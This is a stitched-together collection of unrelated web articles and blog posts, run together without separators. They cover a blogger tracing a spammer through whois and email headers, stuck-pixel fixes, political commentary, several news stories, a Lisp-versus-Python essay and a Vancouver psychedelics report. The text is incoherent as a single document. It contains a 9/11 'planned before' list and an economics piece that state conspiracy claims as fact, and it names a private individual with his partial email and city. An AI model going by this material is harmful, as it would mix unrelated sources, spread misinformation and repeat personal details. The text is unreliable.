So I ’ve removed the hyperlink to Rotten Neighbor above ( which I ’d already relnofollowed ) , and I ’ve removed any attempt to obfuscate Julie Winfield ’s email address .
But wait , it gets better …
So whois rottenneighbor.com ?
Brant Walker brantw2 at cox dot net [ Email address not functional ]
San Diego , California 92101
United States
And who is this Brant Walker ?
Apparently a recent graduate of Platt College in San Diego .
A quick scan of his web portfolio turns up a parody site called Nicotine Island .
Hmm , where have I seen Nicotine Island before ?
Oh yeah , a post by one beverlybimbo in a Yahoo Groups for Smoking and Tobacco Hobbies .
I think I can reconstruct what happened here .
Brant Walker , using the fake identity Julie Winfield , is trying to drive traffic to his Rotten Neighbors site .
He checks out the Alexa Movers & Shakers list and discovers my site listed number 4 because I got dugg last week .
He follows Alexa ’s link to my homepage and clicks to my about page , grabs my email address , and sends me the email at the top .
How am I doing so far ?
Let ’s take a look back at my referrer log entries from just before 4:30 pm yesterday ( when I got the email ) , the ones that I previously thought held no clues .

Of course that could just be anybody who happened upon the Alexa list and clicked over to my site , right ?
Well Brant , meet my smoking gun .
In the headers of the email you sent me , pretending to be Julie , it listed your IP address :

For those of you who have been using LCD monitors for years , you probably know that stuck pixels are an unfortunate reality of these fantastic space - saving devices .
If you ’ve never had to deal with stuck pixels , you have to know that these little screen defects are usually caused by malfunctioning transistors or an uneven distribution of the LCD liquid inside the display .
Fortunately , this problem can usually be fixed .
Here are four techniques that can help you get those stuck pixels in working order again .
Please note : these techniques wo n’t fix dead pixels .
Stuck pixels can be identified by their unchanging color , usually red , blue , green or white .
Dead pixels have no light coming through them ; they are simply black .
Important : None of these methods are guaranteed to work , so you employ them at your own risk .
1- The pixel - fixing software method .
A few software solutions exist out there that will try to re-activate stuck pixels .
Here are a few free ones :
UDPixel : Free application that rapidly changes all pixels located around a stuck one .
Just keep it running for a few hours and see if this eliminates your problem .
JScreenFix : Web - based application that turns all pixels on and off about 60 times per second .
2- The pressure method .
Start by turning off your monitor .
Find a pen that has a rounded , dull end and get a slightly damp cloth to protect your screen .
Fold your cloth in two so that you do not puncture it accidentally .
You do n’t want to scratch your precious screen , do you ?
Put the cloth in front of the stuck pixel and start applying slight pressure on it with your pen .
Do not put pressure anywhere else than on the defective pixel , or you may break additional ones .
Continue applying pressure , and turn your monitor on .
Remove the pen from the screen , and voilà !
The stuck pixel might ( or might not ) be gone .
3- The rubbing method .
This one is easy ; just gently rub the defective pixel with one of your fingers , and hope that this will reset it .
4- The tapping method .
First , display a completely black picture on your screen .
The display has to be turned on for this to work .
Use a small pointed object that has a dull , rounded end and gently tap on the stuck pixel until it starts working again .
You ’ll know if you are applying enough pressure if you are seeing a small , white glow each time you hit the screen .
Display a white picture to verify that you have n’t broken additional pixels .
Usually , LCD manufacturers will usually not replace your display because you have a few stuck or dead pixels on it .
It takes much more than that to convince them to ship you a replacement unit , and unfortunately , by the time your display will be damaged enough to get a free one , your warranty will have expired .
Sean Hannity got a little carried away and had a moment of honesty on H&C the other night with Laura Ingraham .
He was all pumped up and admitted that FOX News helped defeat the immigration bill .
Download Download
Hannity : I think we learned something and you touched on this in the book as it relates to as for example when people get angry , like on the immigration bill .
The fix was in .
Everybody agreed to it .
They did n't expect a push back .
Talk radio got involved , FOX NEWS , the new media all of a sudden people got informed .
They started dialing --- instilled fear in their politicians and it changed .
I thought FOX News was supposed to be a " news " channel and report events --- not act as a wingnut activist organization , instill fear in politicians and try to defeat legislation .
Howard Kurtz agrees with Sean and thinks GOP network activism is A - OK .
I 'd like to know why he feels FOX --- which bills itself as the " fair and balanced " network should be considered a news organization with this type of behavior ?
After all , that 's our major complaint .
Thanks Sean for clearing this up for us .
( CNN ) --
After spending a total of seven months in custody , the Tennessee woman who fatally shot her preacher husband in the back was released on Tuesday , her lawyer told CNN .
Holding baby Breanna , Mary Winkler stands next to Matthew .
In the foreground are Mary Alice and Patricia .
Mary Winkler , a 33 - year - old mother of three girls , was freed from a Tennessee mental health facility where she was treated for depression and post - traumatic stress disorder , lawyer Steve Farese said .
" She is out , " Farese said .
Farese said his client will not talk to the news media because she continues to wage a legal battle to win custody of her girls and faces a $ 2 million civil suit filed by the parents of her slain husband , Matthew Winkler .
Except for her oldest daughter 's brief testimony at her trial , Winkler has n't seen her children in a year , the lawyer said .
Winkler will return to work at the dry cleaners in McMinnville , Tennessee , where she worked before the trial , Farese said .
She is living with friends .
Winkler served about five months in county jail as she awaited trial , then spent two months undergoing therapy at the mental health facility following her conviction for voluntary manslaughter .
Winkler never denied shooting her husband , Matthew , the popular new preacher at the Fourth Street Church of Christ in Selmer , a town of 4,500 people about 80 miles east of Memphis .
Do n't Miss FindLaw : Warrant and affidavit
On March 22 , 2006 , church elders found his body -- with a shotgun wound to the back -- in the bedroom of the parsonage after he failed to show up for an evening service .
His wife was arrested the next day with the couple 's three young daughters in Orange Beach , Alabama , on the Gulf coast .
Mary Winkler was charged with murder , which could have sent her to prison for up to 60 years , but a jury found her guilty of voluntary manslaughter following an emotional trial in which she testified about suffering years of verbal and physical abuse .
In a statement to police after her arrest , Winkler said she did n't recall pulling the trigger .
She said she apologized and wiped the blood that bubbled from her dying husband 's lips as he asked , " Why ? "
Prosecutors and Matthew Winkler 's family members said he was a good husband and father .
But on the stand , Mary Winkler described a hellish 10 - year marriage during which , she said , her husband struck her , screamed at her , criticized her and blamed her when things went wrong .
She said he made her watch pornography and wear " slutty " costumes for sex , and that he forced her to submit to sex acts that made her uncomfortable .
She testified she pointed the shotgun at her husband during an argument to force him to talk through their problems , and " something went off . "
A defense psychologist testified that she was depressed and showed classic symptoms of post - traumatic stress disorder .
Mary Winkler initially received a three - year sentence in June .
But Circuit Court Judge J. Weber McCraw required that she serve only 210 days , and allowed her to serve the rest of the time on probation .
She also received credit for five months she spent behind bars awaiting trial , which left only about 60 days to her sentence .
McCraw ruled she could serve the time in a mental health facility .
Since Mary Winkler 's arrest , the couple 's three children have been cared for by Matthew Winkler 's parents , who have filed court papers seeking to terminate her parental rights .

All About Mary Winkler • Matthew Winkler
Charles Riechers , 47 , came under scrutiny by the Senate armed services committee earlier this month for taking a lucrative job at a defence contractor while awaiting confirmation in his new job as the principle deputy assistant secretary for acquisition .
The job put Mr Riechers in charge of ordering some of the highest priority weapons programmes of the air force , including a $ 40bn aerial refuelling tanker and a $ 15 bn combat and rescue helicopter .
He was found dead at his home in the Virginia suburbs of Washington on Sunday , officials told reporters .
The Senate had held up the appointment for two months .
In the interim , Mr Riechers was paid $ 26,800 for two months ' work as a technical advisor for Commonwealth Research Institute ( CRI ) , a defence contractor .
The job at CRI had been arranged as a favour to the air force , and Mr Reichers told the Washington Post earlier this month that the only work he undertook was to attend a company Christmas party .
" I really did n't do anything for CRI , " he told the newspaper .
" I got a pay cheque from them . "
The air force claimed that Mr Riechers had provided technical advice .
His death comes at a time when the Senate has been criticising the military 's procurement programmes for cost over - runs and late deliveries .
More than two dozen of the Pentagon 's main acquisition programmes had gone over budget by at least 50 % , the committee said earlier this month .
Mrs. Edwards is really starting to make me happy .
She just phoned in to Hardball and asked Ann Coulter to stop the “ language of hate . ” I missed the first part of Edwards ’ call , and will tape it all later , but here is Coulter and Edwards replying to her .
And Chris Matthews did his usual “ ask a hard question , then when she does n’t answer , move on to the next hard question . ”
And do n’t miss the nipple on the woman to the right of Coulter – it ’s simply bizarre that any human being would dress in public like that .
You really have to see it live on TV , it ’s inappropriate as hell , and actually quite apropos of the entire broadcast ( and typical of a Republican Coulter fan – no marriage for me , but feel free to flaunt your nipples in public ) .

UPDATE : ThinkProgress has the entire video now .
He seemed almost broken to me .
His voice raspy , his eyes watery , his affect exhausted , his facial expression almost bewildered .
I thought I would feel angry ; but I found myself verging toward pity .
The case was so weak , the argument so thin , the evidence for optimism so obviously strained that one wondered whom he thought he was persuading .
And the way he framed his case was still divorced from the reality we see in front of our nose : that Iraq is not , as he still seems to believe , full of ordinary people longing for democracy and somehow stymied solely by " extremists " or al Qaeda or Iran , but a country full of groups of people who cannot trust one another , who are still living in the wake of unimaginable totalitarian trauma , who have murdered and tortured and butchered each other in pursuit of religious and ethnic pride and honor for centuries .
This is what Bush cannot recognize : there is no Iraq .
There are no Iraqis .
There may have been at one point - but what tiny patina of national unity that once existed to counter primordial sectarian loyalty was blown away by the anarchy of the Rumsfeld - Franks invasion .
The president 's stunning detachment from this reality tragically endures - whether out of cynicism or delusion or , more worryingly , a simple intellectual inability to understand the country he is determined that the United States occupy for the rest of our lives .
The low - point was his almost desperate recitation of a poignant email that posited that this war is one between " good " and " evil " .
I do n't doubt the sincerity of the sentiment ; I do n't doubt either that the murderous extremes of sectarian hatred or religious fanaticism are , at some level , evil .
I know that the motives of many people who supported this war - and many who still support it - are honorable .
And I know that America is ultimately a force for good in this world .
But that does n't mean that America is incapable or error or immorality .
And to reduce the immense complexity of Iraq to such a binary moralism is a sign of a president reaching for comfortable , Manichean abstractions as a replacement for strategic judgment and knowledge .
The American people deserve better from a war - president : more honesty , more candor , more realism .
Even now ; even in the face of the horror we have witnessed for four years ; even in the face of the failure that is still staring at us , he still cannot see what he has done or what is still unfolding in the Mesopotamian morass .
And he has no policy that effectively matches the crisis with adequate resources .
Short of a draft , we do n't have them .
Anyone who lives here has had to deal with them : 2 - inch - long , Texas - size cockroaches , equal opportunity home invaders that know no demographic or income boundaries .
Now the Houston Museum of Natural Science has issued a casting call for the ever - present pests .
As it stocks a new insect exhibit , the museum has offered to buy up to 1,000 American cockroaches for a quarter apiece from residents who bring them in .
“ We needed a lot of roaches and did n’t have time to collect them all ourselves , ” said Nancy Greig , the museum ’s curator of entomology .
Twice each week before the exhibit opens May 25 , people can turn their roaches into cash at the museum .
The catch is that the insects have to be alive and healthy .

On Saturday , the first day of the roach roundup , entomologist Laurie Pierrel set up a table in the museum lobby .
The first customer , Megan Freemantle , strolled in about an hour later with 39 cockroaches in a plastic box -- the bounty from three days of roach wrangling in her central Houston bungalow .
Catching live roaches was easy , Freemantle said .
She sprinkled dog kibble in the bottoms of 5 - gallon plastic buckets , pushed them against the wall , and let nature take its course .
“ They crawled down the wall and fell into the buckets , ” she said .
For her trouble , Freemantle got an eye - roll from her 17 - year - old daughter and $ 9.75 from the museum -- enough to buy a couple of vanilla lattes , she said .
Terry Vlasch , a third - grade teacher , brought in a Ziploc bag holding one giant roach found crawling in his kitchen sink .
Vlasch said he missed out on a bigger haul by killing about 100 roaches that were hiding under some backyard cinderblocks before the museum ’s offer was announced .
“ I smashed them , ” he said , mourning the lost profit .

The newly purchased roaches were dumped into a plastic box , where they joined some 40 roaches previously caught by museum employees .
For hours , the homely box of bugs attracted children and repulsed parents , who peered inside and looked for roaches among the orange slices , dog food and rotting wood .
The roaches are nasty , said 3 - year - old Serena Schwartz .
They ’re stinky and gross , said Heather Aumiller , 9 .
“ I have cockroaches in my house , ” announced Lola Dinh , 5 .
Her mother , Tracy , blanched .
The museum ’s roach exhibit will feature a large Plexiglas box topped with a dome .
The interior will be set up like a kitchen , Greig said .
The box will be dark until a person ’s head hovers over the dome .
This will activate a light in time to see 1,000 roaches scurrying for cover .
After the museum gets its allotment of roaches , people who bring them in will get a free pass to the museum instead of quarters .
Extra insects may be sent to the big roach hotel in the sky , Greig said , but she doubts few will have to check in .
“ We probably wo n’t get 1,000 , ” she said .
“ They ’re harder to catch than you think . ”

In all , the museum bought just 50 roaches Saturday .
“ We need lots more , ” Pierrel said .
If all else fails , an insect museum in New Orleans has offered to send its extras to Houston .
To catch roaches , Pierrel suggests putting beer - soaked bread in the bottom of a jar , then wrapping the exterior with pantyhose to provide traction for the roaches .
After the bug falls in , it ca n’t crawl out of the smooth glass interior .
Greig said she prefers grabbing a roach with her hand .
“ It ’s much more efficient that way .
You can always wash your hands afterward , ” she said .
Anyone skittish about catching the insects should know that “ roaches are sanitary , ” Greig said .
“ They constantly clean themselves and do n’t feed on filth .
They ’re as clean as your house . ”

UNDERNEWS INDEX E-MAIL US STATS BOOKSHOP LINKS A MATHEMATICAL MODEL
OF BILL O'REILLY
The Progressive Review '
CUMULATIVE WORDS SPOKEN BY O'REILLY AND SULLUM DURING THE INTERVIEW .
THE INTERVIEW WAS ABOUT TWO - THIRDS OVER BEFORE SULLUM GOT THE EDGE
In the first mathematical analysis of Bill O'Reilly ever done , the Review has incontrovertibly proved what was previously believed only anecdotally : O'Reilly is a bully and a jerk .
The study examined O'Reilly 's interview [ sic ] with Jacob Sullum who has written an important book on drugs , " Saying Yes : In Defense of Drug Use . "
Using the advanced technology of Microsoft 's Word Count , the Review determined that Sullum only got in 35 more words than the interviewer , O'Reilly .
O'Reilly got in the longest statements - 89 and 104 words - while Sullum in 35 exchanges only managed to say more than 50 words ( a little less than a half minute ) on three occasions .
In 42.85 % of the exchanges Sullum only managed to get in five words or less .
Ironically , the longest statement of the interview - by O'Reilly - began this way : " We got -- hey , Mr. Sullum , this is a discussion , all right .
You let me get my points in .
I 'll let you get yours in , all right .
Let 's get that straight up . . . "
Up to that point , the interviewee had only managed to get in five more words than the host .
The study also found that while Sullum interrupted O'Reilly seven times , the host interrupted the guest 12 times , providing such useful additions as : O'REILLY : Pinheads like you are encouraging intoxication ...
At the end , O'Reilly - as he often does - graciously told Sullum ; O'REILLY : Look , you irresponsible libertines cause so much damage to this society , you ought to be ashamed of yourself .
I 'll give you the last word .
In fact , not only did O'Reilly managed to get in four more last thoughts but they added up to 33 more words than Sullum was able to squeeze in .
UPDATE
Covertly applying this research , your editor recently took on O'Reilly and managed to do considerably better .
In sum , he managed 104 more words than the interviewer , nearly three times as many as Sullum .
Further , editor Sam actually gave two answers of 78 and 84 words .
Note that for only one brief instance did O'Reilly outtalk Sam .
And while Sullum was restricted to five or less words in 42.85 % of his exchanges , Sam was reduced to five or less words in only 31.11 % of his replies .
Did 9/11 really " change everything " ?
Or was everything we 're seeing now planned before 9/11 ?
The Afghanistan war was planned before 9/11 The decision to launch the Iraq war was made before 9/11
The decision to launch a war against Iran was made before 9/11 The Patriot Act was written before 9/11
The government 's spying on Americans began before 9/11 ( confirmed here and here ) .
The government knew that terrorists could use planes as weapons -- and had even run its own drills of planes being used as weapons against the World Trade Center and other U.S. high - profile buildings , using REAL airplanes -- all before 9/11 The government heard the 9/11 plans from the hijackers ' own mouths before 9/11
No steel - framed high - rise building had ever collapsed due to fire before 9/11
The neocons who now run the U.S. government lamented , before 9/11 , that they could not institute their plans for global domination without a " new Pearl Harbor " .
The “ Crash Of 2007 - 8 ” Is Underway
By Richard C. Cook
19 August , 2007
Global Research
T he immediate triggers are being described quite well : the collapse of the U.S. subprime mortgage market ; the vulnerability of the rest of the economy to the subprime undertow , due to the “ efficiency ” of the markets in spreading risk ; the worldwide overextension of cheap credit ; the failure of large institutional investors and Wall Street brokerages to behave responsibly ; and the long - term effects of the U.S. trade and fiscal deficits which are now coming home to roost .
Amazingly , some commentators have been asking “ if the monetary crisis will affect the producing economy , ” and whether a recession lies ahead .
In reality , the U.S. producing economy has been in a recession for the last year .
This is shown most clearly by the decline in M1 , the portion of the money supply immediately available to people for making purchases .
The causes of the M1 decline are two - fold .
One is the weak purchasing power of American consumers , at least half of whose decently - paying manufacturing jobs have been eliminated by the outsourcing , mergers , and productivity improvements during the past two decades .
The other is that while many of the U.S. corporations not connected to housing have been doing all right , their success has been tied to overseas investments and sales , such as GE and GM who are heavily invested in China .
This type of business activity props up the stock prices of these global corporations but does little for the working American .
The presumption that overflow earnings from stockholders will benefit the rest of our domestic economy is the essence of “ trickle - down , ” supply - side economics and is part of the justification for the system that makes the rich richer and the poor poorer .
But as Barron ’s reported earlier this year , much of the profits from the global corporations are being held as retained earnings for future growth , rather than being passed on to stockholders as dividends .
Because of the heavy debt load corporations carry today , they are all in a grow - or - die mode .
Again , the result is deficient purchasing power which works to negate the already dubious trickle - down effect .
The recession has been masked by four factors : 1 ) the government ’s phony GDP numbers , where the “ churning ” of financial transactions masquerade as production ; 2 ) the froth on the stock market that took the Dow Jones Average ( DJA ) from a little over 11,000 to a record - breaking 14,000 during a one - year period that ended with the decline that began in mid-July ; 2 ) the propensity of the American consumer , which is now ending , to continue to buy goods and services on credit , including necessities of life like health care ; and 3 ) modest growth in low - paying service economy jobs , which also may be coming to an end .
These lesser bubbles have mirrored the big ones that are bursting as lenders lose confidence in the ability of borrowers to repay .
These are the housing bubble , affecting consumers ; the acquisition bubble , affecting equity funds ; and the speculation bubble , affecting hedge funds .
As the house of cards comes tumbling down , the leading question on financial websites and blogs is how deep will the decline go .
Will it stop at the level of the recessions of previous decades , including 2000 - 2002 , with a decline that is reflected in the DJA of somewhere around thirty - five percent from its peak ?
Or will it be the “ Armageddon ” scenario which would take us to depression - level conditions ?
Of course there are multiple possibilities based on a decline somewhere between a recession and a depression that would share some of the characteristics of each .
Muddying the waters is the fact that the DJA is much less reliable as a measure of economic health today than in the past .
This is because today the vast majority of financial transactions now take place within the furtive secrecy of the equity , hedge , and derivative markets .
No one really knows what is going on , except that on any given day an announcement is made that another fund or company has been wiped out .
Neither the Federal Reserve nor the U.S. government believes they have an obligation to gather or publish data that will help the public gauge the effects of these crises on their homes or jobs .
Some might call this negligence a crime against democracy .
In fact the Federal Reserve made tracking even more difficult by ceasing to report the M3 macro-currency numbers , but researchers have shown that growth in M3 is soaring while M1 goes down .
What appears to be happening right now is that the Federal Reserve , which oversees the U.S. economy on behalf of the financial , corporate , and government elites , is deliberately trying to squeeze as much debt out of the economy as it can .
It is doing this with interest rates that are high relative to actual conditions , while trying to avoid the Armageddon scenario .
The Fed is carrying out its “ soft - landing ” policy by holding credit tight while introducing “ liquidity ” into the markets on a day - by - day basis through use of overnight “ repos ” and by cutting the discount rate for bank borrowing .
Conservative columnists like George Will and Bob Novak watch and shake their pom-poms from the sidelines .
But “ liquidity ” is just a fancy name for more loans .
The one thing we can be certain of is that every loan bears interest charges which someday , somehow , will have to be paid by a person who works for a living .
And if you wondered where the Fed got the $ 34 billion in liquidity it pumped into the markets on Friday , August 10 , you were n’t the only one .
The answer is that the Fed has a secret room upstairs where it keeps a large “ printing press . ”
It ’s legalized counterfeiting , but as with any counterfeit money , if people accept it in trade it acts just like the real stuff — for a while .
The danger , which many commentators are pointing to , is that the Fed will ignite a hyperinflation , which may be what is happening and may actually be intentional because it devalues debt .
It ’s what happens when debt is used to pay off debt and is in fact an invisible tax .
Such inflation is difficult to discern , again because of the government ’s rigged statistics .
The most important indicator to watch is the price of oil , which does n’t show up in “ core inflation . ”
But there are signs that the “ soft landing ” is working , such as a modest increase in U.S. exports .
Reflecting the weak dollar , China is now charging more for its own exports , which will stimulate our industry here at home .
And the Fed ’s discount rate cut last Friday sparked a modest stock market rally .
Meanwhile , there is a debate over whether quasi-public agencies like Fannie Mae and Freddie Mac should be used to spread the housing market losses across the entire taxpaying population .
While society as a whole is made poorer , many individuals who might have lost their homes or jobs are spared some pain .
So it ’s hard to argue against it .
But this type of bail - out would benefit individual homeowners more than the big banks , so the conservative politicians and commentators oppose it .
But there ’s a bigger picture .
The strategy of the Fed is likely to allow the recession to proceed but it does want to get the economy moving again before the downturn goes too far .
In fact they probably plan to do it in time for the 2008 presidential election .
The Fed wants to see a recovery in place by then so the American public will go back to sleep and elect another politician who will steadfastly protect the privileges and powers of the magnates who , through the Fed , rule the world .
Even if a new president has some progressive ideas , he or she wo n’t be able to alter much if a recovery has started .
The “ soft landing ” is a political power play .
It ’s what they did in 1984 , when Ronald Reagan was reelected on a campaign theme of “ It ’s morning in America , ” after the Fed let up following the twenty percent - plus rates it used to trash the producing economy from 1979 - 83 .
The Fed did the same with the housing bubble to get George W. Bush reelected in 2004 .
The financiers ’ worst fear is that if things get too bad the American people might elect a reformer in 2008 .
So far the corporate press has kept two such reformers — Ron Paul and Dennis Kucinich — in the shadows .
Now that Hillary Clinton is starting to sound more progressive , they ’ll attack her overtly since she is too big a player to be ignored .
The Washington Post has already begun .
So we ’ll see if the Fed ’s plan succeeds as well over the next couple of years as it has in the past .
In the meantime , what remains firmly in place is the monetarist regime through which the financiers and the Fed have ruled America for the past thirty - six years , since President Richard Nixon closed the gold window for international exchange in 1971 .
During this period , we have seen several interlocking phenomena : 1 ) interest rates that on the whole have been much higher than the previous period of the New Deal and its aftermath , lasting into the 1960s ; 2 ) inflation that has eroded eighty percent of the value of the dollar ; 3 ) replacement of our producing industrial economy with a service economy dominated by high finance ; 4 ) almost continuous warfare with a clear objective of world domination whose purpose is to shore up the dollar as the world ’s reserve currency ; 5 ) ever - deepening public , private , and household debt ; 6 ) the ever - widening gap between rich and poor , with increasing numbers of the poor , homeless , and hungry who are left out of the nation ’s economic life ; 7 ) a crisis in the nation ’s crumbling infrastructure ; and 8 ) the constant whipsawing of over 200 million ordinary people .
It ’s our citizens who are batted around like ping pong balls between alternating conditions of boom and bust as every few years many of them watch the overnight disappearance of their homes , pensions , savings , health insurance , and jobs .
Added to this is the stress that has eroded the health and even life expectancy of the U.S. population .
It ’s a horrible picture created by a filthy system .
It ’s why religious leaders for thousands of years have characterized usury , and a culture ruled by usury , as a crime against God and humanity .
The monetarist rule of the Federal Reserve is legal , institutionalized usury .
Over the years they have mastered all the tools of the trade , the objective of which is to continually allow the financial superstructure to skim the cream off the producing economy .
Come to think of it , is n’t that how the Mafia used to work with its protection and loan - sharking rackets ?
And can anything be done about it ?
Of course .
In previous articles on the Global Research website and elsewhere , this writer has offered a list of reforms — mostly monetary — that can and should be made .
They all involve the recognition of credit as a public utility , part of the societal commons , not the private playground of the financiers , with the Fed as their facilitator .
Low - cost credit overseen by the federal government was the basic building block of the New Deal .
It was done by strong people with an ideal of public service , though in many respects they did n’t go far enough and relied too much on World War II and armaments to attain a full - employment economy .
We now need a New Deal for the 21st century that would correct the flaws of the last one , resolve the present crisis , and carry us into a future that will benefit everyone , not just the privileged few .

I 've met lots of people who complain about Lisp and lots of people ( especially Lisp folks ) who complain about Python .
Lisp is very elegant .
There 's something nice about its syntax ( do n't laugh ! ) .
The uniformity lets you do all sorts of neat things once you have macros .
The basic syntactic construct in Lisp is the list , ( a b c … ) , and it can mean lots of things :
Sometimes ( f x ) is a function call , and f is the name of the function , and x is evaluated as an argument .
Sometimes ( f x ) is a macro invocation , and f is the name of the macro , and x may be treated specially ( it 's up to the macro to decide ) .
Sometimes ( f x ) is a binding .
For example , ( let ( ( f x ) ) … ) binds a new variable f to the value x .
Sometimes ( f x ) is a list of names .
For example , ( lambda ( f x ) … ) creates a function that has parameters named f and x .
Sometimes ( f x ) is a literal list .
For example , ( quote ( f x ) ) .
Sometimes ( f x ) is interpreted in some other way because it 's enclosed inside a macro .
How it 's interpreted depends on the macro definition .
The ability to use the same syntactic form for so many different things give you great power .
You can define all sorts of cool things this way .
I 'm writing a pattern matcher that uses list expressions to define patterns and macros to interpret those list expressions .
Macros are great for writing elegant , concise code .
The trouble is that you can't easily tell just by looking at ( f x ) how to interpret it .
It could do anything .
You 'd think maybe a text editor like Emacs ( which uses Lisp as its native language ) would be able to help you in some way .
But no .
Emacs can't tell either .
So how can you , the person reading the code , figure it out ?
Well , you can , but it takes a lot of effort .
You can't determine the syntactic meaning of code ( e.g. , whether it's a definition or an expression ) by looking at the code locally ; you have to know a lot more of the program to figure it out .
Lisp 's syntactic strength is at the same time a weakness .
Python on the other hand has no macros and does n't give you much to write concise , abstract , elegant code .
There 's a lot of repetition and many times it 's downright verbose .
But where Lisp is nice to write and hard to read , Python makes the opposite tradeoff .
It 's easy to read .
You can determine how to interpret something — a string , a list , a function call , a definition — just by looking at the code locally .
You never have to worry that somewhere in some other module someone defined a macro that changes the meaning of everything you 're reading .
By restricting what people can write , the job of the reader becomes easier .
Lisp seems to be optimized for writing code ; Python seems to be optimized for reading it .
Which you prefer may depend on how often you write new code vs. read unfamiliar code ; I 'm not entirely sure .
What bothers me the most though is not that these two languages do different things , but that the people who argue about it seem to think that there is one “ best ” answer , and do n't see that this is a tradeoff .
When I 'm writing code I prefer Lisp ; when I 'm reading code I prefer Python .
I think this is an inherent tradeoff — any added flexibility for the writer means an added burden for the reader , and there is no answer that will be right for everyone .
– Amit
P.S. When I read debates online , I have a bias towards the people who view these things as tradeoffs and a bias against the people who say there 's only one right answer and everyone else is stupid or clueless .
This has sadly pushed me away from Lisp , the Mac , and other systems that I think are really good but have fanatical communities .
When you 're in a debate , consider that the other person might not be stupid , and there might be good reasons for his or her choices .
You 'll not only learn something about their position , but you 'll be more likely get people to listen to you and adopt your point of view .

Roma Horrell says the operation has transformed her life
They are part of a new scheme aimed at increasing the number of donor organs .
Peter Horrell , from Cambridgeshire , donated one of his kidneys to a man from Lothian , while the man 's wife gave a kidney to Mr Horrell 's wife Roma .
Mrs Horrell , whose husband 's kidney was not compatible for her , and the man benefited from laws introduced in 2006 allowing live donations from strangers .
Until the new laws came in last September , patients could receive a live transplant only from a relative or close friend .
' Freedom back '
Mrs Horrell , who had her operation three months ago , said it had transformed her life .
It 's a sensible step forward which will hopefully help more people get off the waiting list
Andrew Bradley
Addenbrooke 's Hospital surgeon
" I used to do home dialysis twice a day so it was quite a burden , " she said .
" Plus I got crippling gout , one of the side - effects of my kidney failure .
" Sometimes I was barely able to walk or bend down .
Now I feel really well , it 's given me my freedom back . "
Mr Horrell wanted to donate his kidney to his wife but he was not a compatible donor , and says this is the next best thing .
" As far as I was concerned I was helping Roma in this way .
We 're also very grateful to the woman in Scotland who gave a kidney to Roma .
Indeed , everyone has benefited , " he said .
One kidney was flown down from Scotland
The transplants involved four carefully co-ordinated operations at Addenbrooke 's Hospital , in Cambridge , and at Edinburgh Royal Infirmary .
Mr Horrell 's kidney was packed in an ice - cold solution and sealed inside a plastic bag .
It was then driven to a local airport and flown to Edinburgh .
The reverse happened with the donor kidney for Mrs Horrell .
The transplant surgery in Cambridge and Edinburgh would have been illegal until 1 September 2006 when the law was changed .
It is hoped the new rules will increase the number of organs available .
' Sensible step '
Professor Andrew Bradley , a surgeon at Addenbrooke 's Hospital , carried out one of the transplants .
He said other countries had used paired transplantation for years .
" It 's a sensible step forward which will hopefully help more people get off the waiting list , " he said .
" At the moment people spend on average three or four years waiting for a kidney and many never get a transplant . "
The Scottish couple involved want to remain anonymous , but Mr and Mrs Horrell hope by publicising their involvement it may encourage other couples - where one needs a new kidney - to go on a special paired transplant register .
There are currently 31 couples on the list .
About 6,500 people are waiting for a new kidney in the UK and last year about 2,000 kidney transplants were performed .

Thou shall not drive under the influence of alcohol .
Thou shall respect speed limits .
Thou shall not consider a car an object of personal glorification or use it as a place of sin .
The Vatican took a break from strictly theological matters to issue its rules of the road , a compendium of dos and don'ts on the moral aspects of motoring .
A 36 - page document called " Guidelines for the Pastoral Care of the Road " contains Ten Commandments covering everything from road rage , respecting pedestrians , keeping a car in good order and avoiding rude gestures while behind the wheel .
Drivers are urged to obey traffic regulations , drive with a moral sense , and even consider saying a little prayer whenever they sit in the driver 's seat .
" Cars tend to bring out the ' primitive ' side of human beings , thereby producing rather unpleasant results , " the document said .
The Vatican said it issued the guidance because driving has become such a big part of modern life .
" We know that as a consequence of transgressions and negligence , 1.2 million people die each year on the roads , " said Cardinal Renato Martino .
" That 's a sad reality , and at the same time , a great challenge for society and the church . "
The document does not demonise driving , however .
It also extols the benefits , including family outings and transporting the sick to hospital .
Vancouver 's top drug policy official and B.C. public health physicians believe addicts might be treated by giving them psychedelic drugs , and they hope the city will lead in exploring the controversial approach .
Announcements , Events & more from Tyee and select partners John Horton ’s Paintings Preserve History .
His Seamanship Saves Lives
Meet the fascinating Order of BC winner who also happens to be a Tyee supporter .
Powerful hallucinogens such as ayahuasca and peyote could offer addicts and other sick people " profound benefits , " Donald MacPherson , Drug Policy Co-ordinator for the city of Vancouver , told The Tyee .
MacPherson is co-author of a report published by the city in November that puts ayahuasca and peyote in the category of " benefit , " based on their traditional use by indigenous cultures and on documented studies by researchers .
Ayahuasca , an Amazonian , vine - based tea brew , is cited as " non-addictive " and as a " powerful therapeutic tool " used for centuries in Peruvian and Brazilian ceremonial settings .
Peyote , the report notes , is " legally administered as a ritualistic sacrament by the members of the Native American Church as an antidote to alcoholism . "
The report , titled Preventing Harm from Psychoactive Substance Use , recommends that the city forge ties across all levels of health care and communities and facilitate " exploration , study and application of traditional medicines and rituals and of evidence - based alternative approaches towards the prevention , healing and recovery from problematic substance use . "
" Our report is certainly pushing the envelope , but these drugs could have profound therapeutic and spiritual benefits , " MacPherson told The Tyee .
" We think that demonizing these psychedelic drugs is totally bizarre , and their benefits should be explored . "
The Vancouver city report followed a report published by The Health Officers Council of B.C. which recommends that restrictions be loosened on the use of psychedelics as therapeutics in controlled medical settings .
Return to Hollywood Hospital ?
If Vancouver 's officialdom were to follow such recommendations , it would n't be the first time the city found itself at the centre of a worldwide interest in the potential healing properties of hallucinogens .
In the late 1950s , New Westminster - based Hollywood Hospital was a leader in therapeutic psychedelics , almost a decade before Timothy Leary encouraged the masses to " turn on , tune in and drop out " on acid .
Founded by eccentric American entrepreneur Al Hubbard , Hollywood Hospital catered to a mixed clientele of American celebrities and Canadian politicians given LSD to treat alcoholism , drug addiction and psychological burn - out .
For almost a decade after LSD was criminalized in North America in the late 1960s , Hollywood Hospital served up therapeutic LSD before the provincial government pulled funding in 1975 and the hospital closed .
Pharmaceutical drugs soon became the government - sponsored substances of choice .
But a number of academics refused to give up the fight for therapeutic psychedelics and today , LSD , MDMA ( " ecstasy " ) psilocybin ( " magic mushrooms " ) and ibogaine are being used to treat everything from cancer pain to addictions to anxiety disorders at prestigious universities and private research centres .
Ibogaine in Vancouver
In Vancouver , Prince of Pot Marc Emery opened up a therapy centre to treat dozens of downtown eastside drug addicts with ibogaine in 2003 before he ran out of funds .
Now a group called The Iboga Therapy House has re-started the program and is looking for Health Canada funding .
